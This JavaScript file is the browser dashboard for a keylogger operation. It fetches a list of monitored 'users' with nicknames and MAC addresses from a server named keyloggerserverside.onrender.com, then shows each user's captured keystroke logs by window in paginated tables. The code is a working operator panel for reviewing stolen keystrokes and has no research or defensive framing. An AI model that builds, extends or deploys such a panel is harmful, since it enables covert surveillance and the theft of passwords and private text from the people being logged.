function loadButtons() {
    fetch('https://keyloggerserverside.onrender.com/users/list_of_users', {method: 'GET',headers:{
        'ngrok-skip-browser-warning': 'true',  // Add the header here
      }})
        .then(response => response.json())
        .then(jsons => jsons.users)
        .then(data => {
            console.log(data)
                const container = document.getElementById('buttons_container')
                data.forEach(file => {
                    const button = document.createElement('button');
                    const p1 = document.createElement('p')
                    p1.classList.add('p_button')
                    const p2 = document.createElement('p')
                    p2.classList.add('p_button')
                    const br = document.createElement('br')
                    p1.textContent = `name: ${file.nickname}`
                    p2.textContent = `mac adress: ${file.mac_address}`
                    button.classList.add('button', 'button_hover', 'a_buttons')
                    button.id = file._id
                    button.appendChild(p1)
                    button.appendChild(br)
                    button.appendChild(p2)
                    button.onclick = function() {
                        clicking(button.id)
                    }
                    container.appendChild(button)
                    

                })

            }
        )
}

function clicking(user_id) {
    const id = user_id
    window.location.href = `dashboard?id=${user_id}`
}

function addDataToTable(selectedData){

    // Erase previous content
    const tableBody = document.getElementById('table-body');
    while (tableBody.firstChild) {
        tableBody.removeChild(tableBody.firstChild);
    }
    

        for (const [key, value] of Object.entries(selectedData)) {
            const tr = document.createElement('tr');
            const tdKey = document.createElement('td');
            tdKey.textContent = key;
            const tdValue = document.createElement('td');
            tdValue.textContent = value;
            tr.appendChild(tdKey);
            tr.appendChild(tdValue);
            document.getElementById('table-body').appendChild(tr);
        }
}
function listenToChangeOfWindow(data){
    const container = document.getElementById('selection_win')
    container.addEventListener('change', () => {
        const selectOption = container.value

        const selectedData = data[selectOption];

        addDataToTable(selectedData)
    })
}

function receiveUserData() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const container = document.getElementById('selection_win');
    const output = document.createElement('p');
    output.id = 'output';
    const body = document.getElementById('body');
    body.appendChild(output);
    
    // Number of items per page
    const itemsPerPage = 5;  // You can change this number based on your needs
    let currentPage = 1;
    let logsData = [];

    fetch(`https://keyloggerserverside.onrender.com/data/get_logs_for_user?id=${id}`, { method: 'GET' })
        .then(response => response.json())
        .then(data => data.logs)
        .then(data => {
            logsData = data;
            // Create the options for selection
            for (const win in data) {
                const option = document.createElement('option');
                option.textContent = String(win);
                option.value = win;
                container.appendChild(option);
            }

            // Initially load the first page of data
            loadPage(currentPage);

            // Add pagination controls
            const pagination = document.createElement('div');
            pagination.id = 'pagination';
            body.appendChild(pagination);

            // Create Previous and Next buttons
            const prevButton = document.createElement('button');
            prevButton.textContent = 'Previous';
            prevButton.disabled = currentPage === 1;
            prevButton.onclick = () => {
                if (currentPage > 1) {
                    currentPage--;
                    loadPage(currentPage);
                }
            };
            pagination.appendChild(prevButton);

            const nextButton = document.createElement('button');
            nextButton.textContent = 'Next';
            nextButton.disabled = currentPage * itemsPerPage >= Object.keys(logsData).length;
            nextButton.onclick = () => {
                if (currentPage * itemsPerPage < Object.keys(logsData).length) {
                    currentPage++;
                    loadPage(currentPage);
                }
            };
            pagination.appendChild(nextButton);

            // Function to load data for the current page
            function loadPage(page) {
                const start = (page - 1) * itemsPerPage;
                const end = start + itemsPerPage;
                const pageData = Object.entries(logsData).slice(start, end);

                // Clear the existing data in the table or container
                const table = document.getElementById('table'); // Assuming you have a table to show data
                table.innerHTML = ''; // Clear current data

                // Render the new data for the current page
                pageData.forEach(([key, value]) => {
                    const row = document.createElement('tr');
                    const keyCell = document.createElement('td');
                    keyCell.textContent = key;
                    row.appendChild(keyCell);

                    const valueCell = document.createElement('td');
                    valueCell.textContent = value;
                    row.appendChild(valueCell);

                    table.appendChild(row);
                });

                // Update the enabled state of the buttons
                prevButton.disabled = page === 1;
                nextButton.disabled = page * itemsPerPage >= Object.keys(logsData).length;
            }
        });
}
